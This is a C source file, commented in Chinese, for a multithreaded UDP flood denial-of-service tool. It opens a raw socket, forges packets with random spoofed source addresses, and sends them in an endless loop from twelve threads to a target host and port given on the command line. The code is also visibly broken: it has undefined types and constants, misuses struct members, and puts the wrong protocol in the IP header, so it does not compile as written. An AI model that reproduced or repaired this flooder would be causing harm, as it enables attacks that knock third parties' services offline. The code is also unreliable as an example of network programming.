#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <pthread.h>

#define MAXCHILD 12
#define K 1024
#define DATUML (3*K)

static unsigned long dest = 0;
static int PROTO_ICMP = -1;
static int alive = -1;
static int rawsock;
static int dest_port = 80;

static inline long myrandom(int begin,int end);
static unsigned short dos_cksum(unsigned short *data,int length);
static void dos_fun(unsigned long ip);
static void dos_udp(void);
static void * dos_sig(int signo);


/*
* 随机函数
*/
static inline long myrandom(int begin,int end){
	int gap = end - begin+1;
	int ret =0;
	srand((unsigned)time(0));
	ret = random() % gap + begin;
	return ret;
}

static unsigned short dos_cksum(unsigned short *data,int length){
	register int left = length;
	register unsigned short *word = data;
	register int sum = 0;
	unsigned short ret = 0;
	/*计算偶数字节*/
	while(left >1){
		sum += *word++;
		left -= 2;
	}
	/*如果是奇数，将最后一个字节单独计算，剩余的一个字节为高字节构建一个short类型变量*/
	if(left == 1){
		*(unsigned char *) (&ret) = *(unsigned char *) word;
		sum += ret;
	}

	/*折叠*/
	sum = (sum >> 16) +(sum & 0xFFFF);
	sum += (sum >> 16);
	/*取反*/
	ret = ~sum;
	return (ret);
}

/*多线程函数*/
static void dos_fun(unsigned long ip){
	while(alive){
		dos_udp();
	}
}

static void dos_udp(){
	/*数据长度*/
	int tot_len = sizeof(struct ip)+sizeof(struct udphdr)+DATUML;
	/*发送目的地址*/
	struct sockaddr_in to;

	/*Dos结构，分为ip头部，udp头部，udp数据部分*/
	struct dosseg_t{
		struct ip iph;
		struct udphdr udph;
		unsigned char data[65535];
	} dosseg;
	dosseg.iph->ip_v = 4;
	dosseg.iph->ip_hl = 5;
	dosseg.iph->ip_tos = 0;
	dosseg.iph->ip_len = htons(tot_len);
	dosseg.iph->ip_id = htons(getpid());
	dosseg.iph->ip_off = 0;
	dosseg.iph->ip_ttl = myrandom(200,255);
	dosseg.iph->ip_p = PROTO_ICMP;
	dosseg.iph->ip_sum = 0;
	dosseg.iph->ip_src = (unsigned long) myrandom(0,65535);
	dosseg.iph->ip_dst = dest;
	dosseg.iph->ip_sum = dos_cksum((u16 *)dosseg.iph,sizeof(dosseg.iph));

#ifdef __FAVOR_BSD
	/*udp*/
	dosseg.udph.uh_sport = (unsigned long)myrandom(0,65535);
	dosseg.udph.uh_dport = dest_port;
	dosseg.udph.uh_ulen = htons(sizeof(dosseg.udph)+DATUML);
	dosseg.udph.uh_sum = 0;
	dosseg.udph.uh_sum = dos_cksum((u16 *)&dosseg.udph,tot_len);
#else
	/*udp*/
	dosseg.udph.source = (unsigned long)myrandom(0,65535);
	dosseg.udph.dest = dest_port;
	dosseg.udph.len = htons(sizeof(dosseg.udph)+DATUML);
	dosseg.udph.check = 0;
	dosseg.udph.check = dos_cksum((u16 *)&dosseg.udph,tot_len);
#endif
	/*填写发送目的地址*/
	to.sin_family = AF_INET;
	to.sin_addr.s_addr = dest;
	to.sin_port = htons(0);
	/*发送数据*/
	sendto(rawsock,&dosseg,tot_len,0,(struct sockaddr *)&to,sizeof(struct sockaddr));
}



static void * dos_sig(int signo){

}

int main(int argc,char *argv[]){
	struct hostent * host = NULL;
	struct protoent * protocol = NULL;
	char protoname[] = "icmp";
	int i = 0;
	pthread_t pthread[MAXCHILD];
	int err = -1;
	alive = 1;
	signal(SIGINT,dos_sig);//截取信号ctrl+c
	if(argc <3){
		return -1;
	}

	protocol = getprotobyname(protoname);
	if(protocol == NULL){
		perror("getprotobyname");
		return -1;
	}

	PROTO_ICMP = protocol->p_proto;

	dest = inet_addr(argv[1]);
	if(dest == INADDR_NONE){
		host = gethostbyname(argv[1]);
		if(host == NULL){
			perror("gethostbyname");
			return -1;
		}

		memcpy((char *)&dest,host->h_addr.s_addr,host->h_length);
	}
	dest_port = atoi(argv[2]);
	rawsock = socket(AF_INET,SOCK_RAW,RAW);//建立原始socket
	if(rawsock <0){
		rawsock = socket(AF_INET,SOCK_RAW,IPROTO_UDP);
	}
	setsockopt(rawsock,SOL_IP,IP_HDRINCL,"1",sizeof("1"));
	//设置ip
	for (int i = 0; i < MAXCHILD; ++i)
	{
		err = pthread_create(&pthread[i],NULL,dos_fun,NULL);
	}
	for (int i = 0; i < MAXCHILD; ++i)
	{
		pthread_join(pthread[i],NULL);
	}
	close(rawsock);
	return 0;


}